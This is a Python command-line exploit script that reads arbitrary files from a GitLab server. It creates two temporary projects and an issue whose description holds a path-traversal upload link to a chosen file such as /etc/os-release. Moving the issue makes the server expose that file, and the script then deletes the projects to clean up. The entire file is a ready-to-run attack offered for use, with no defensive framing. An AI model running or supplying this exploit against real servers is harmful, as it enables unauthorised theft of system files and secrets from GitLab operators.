#!/usr/bin/python3
import os
from gitlab import *
import urllib3
import tempfile
import argparse

# hide insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def temp_name():
    return next(tempfile._get_candidate_names())

def exploit(args):
    
    # Establish connection with Gitlab
    gl = Gitlab(args.HOST, private_token=args.token, ssl_verify=args.ssl)
    gl.auth()

    # Generate project/issue names
    p1_name = temp_name()
    p2_name = temp_name()

    # Create projects
    p1 = gl.projects.create({'name': p1_name})
    p2 = gl.projects.create({'name': p2_name})
    print(f"[+] Created projects '{p1.name}' and '{p2.name}'")

    # START exploit: create issue and move to other project
    issue_name = temp_name()
    issue_data = {
        'title': issue_name,
        'description': \
        f"![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{args.REMOTE_FILE})"
    }

    issue = p1.issues.create(issue_data)
    print(f"[+] Created issue '{issue_name}' for target file: {args.REMOTE_FILE}")

    try:
        issue.move(p2.id)

        print(f"[-] Find your file at {p2.issues.list()[0].web_url}")
        os.system(f"firefox {p2.issues.list()[0].web_url}")
        input("[-] Press ENTER after you retrieved your file...")

    except Exception as e:
        print(f"[!] Failed to move issues, likely file permission error...")
        pass

    # END exploit
    

    # Clean up after ourself
    gl.projects.delete(p1.id)
    gl.projects.delete(p2.id)
    print(f"[-] Deleted projects '{p1.name}' and '{p2.name}'")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--token', type=str, help='Private token generated at Settings>Access Tokens on Gitlab', required=True)
    parser.add_argument('--ssl', type=bool, help='Enable SSL verification, leave disabled if instance uses self-signed certificates.', default=False)
    parser.add_argument('HOST', type=str, help='http(s)://example.com')
    parser.add_argument('REMOTE_FILE', type=str, help='File to retrieve i.e. /etc/os-release')
    args = parser.parse_args()

    # yeet
    exploit(args)
            
